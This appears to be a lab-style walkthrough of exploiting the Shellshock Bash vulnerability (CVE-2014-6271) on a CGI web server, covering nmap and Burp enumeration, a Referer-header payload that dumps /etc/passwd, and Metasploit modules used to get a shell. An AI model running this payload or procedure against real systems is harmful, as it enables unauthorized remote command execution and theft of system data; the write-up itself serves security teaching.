# ShellShock Exploitation
In September 2014, when a single security bug in Bash was disclosed there was chaos in the security community. [Bash](https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-1-bash-basics-0149422/) is a shell, or interpreter, that allows commands to be run on a system, typically via a text window. It usually is the default shell on Unix systems, and as such, can be found on Linux, [macOS](https://mac-how-to.gadgethacks.com/how-to/every-mac-is-vulnerable-shellshock-bash-exploit-heres-patch-os-x-0157606/), and other various Unix flavors. This is why Shellshock is so severe — over half the [web servers](https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-11-apache-web-servers-0148695/) on the internet are running Unix, not to mention a myriad of [IoT devices](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-disabling-security-cameras-any-wireless-network-with-aireplay-ng-0185435/) and even some [routers](https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-any-routers-web-interface-using-shodan-0154660/).

This bug allowed attackers to escalate privileges and execute arbitrary code on a remote machine. It affected most versions of Linux and UNIX-based OSes and (obviously) was considered a critical vulnerability.

Even though Bash is not an internet-facing service, many internet and network services such as web servers use environment variables to communicate with the server's operating system.Since the environment variables are not sanitized properly by Bash before being executed, the attacker can send commands to the server through HTTP requests and get them executed by the web server operating system. The shellshock vulnerability, discovered by Stephane Chazelas was assigned the CVE identifier CVE-2014-6271. A similar bug with identical consequences was discovered by Tavis Ormandy and was assigned the CVE identifier CVE-2014-7169.


# Enumeration of Services

So lets scan the target machine using nmap 

``nmap <target ip>``

![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/nmap.png)
okay, so we found http service open so let browse and see what we get from there

![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/browser.png)
As we know that For this exploit to work, there needs to be an executable script located in the /cgi-bin directory.

There is a option in burp to discover content so lets intercept the target and use burpsuite.
> right click on target  > engagement tool >discover content 

![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/burp.png)
We can see that we have cgi-bin folder 
![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/burp_content.png)

Let send the request in Repeater and try to view the file
![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/Burp_repeat.png)
Okay now lets crafts an HTTP request that contains the below headers:

`GET http://test.com/cgi-bin/test.cgi HTTP/1.1`  
`User-Agent: google`  
`Host: test.com`  
`Referer: () { :;}; echo "NS:" $(</etc/passwd)`

Once the target server receives the HTTP request with the above headers, it responds by sending the content of the file /etc/passwd, as seen in the below HTTP response:
![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/burp_enum.png)
What does this mean? The attacker was able to execute operating system commands through an HTTP request. An attacker can use any other command that allows him to take full control of the server.

>Similarly we can use metasploit to enumerate the users and exploits 

open msfconsole in terminal using `msfconsole`

Search for shellshock 

``msf5  > search shellshock``

![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/Meta_enum.png)
use cgi auxillary as we confirmed the cgi file is present
```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > show options

Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CMD        /usr/bin/id      yes       Command to run (absolute paths required)
   CVE        CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER     User-Agent       yes       HTTP header to use
   METHOD     GET              yes       HTTP method to use
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                   yes       Path to CGI script
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

```
we need to set the required field like rhost,targeturi to run the scanner

![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/Meta_enum2.png)
We succesfully enumerated user with there id.

# Exploitation of Services

As we know that apache cgi module is vulnerable we can use apache exploit
So we need to follow same steps as enumeration and will get the shell.

![enter image description here](https://raw.githubusercontent.com/shubham381/ShellShock/master/meta%20exploit.png)

> Tools for Reference:
https://github.com/nccgroup/shocker.git
https://github.com/0xICF/ShellScan.git
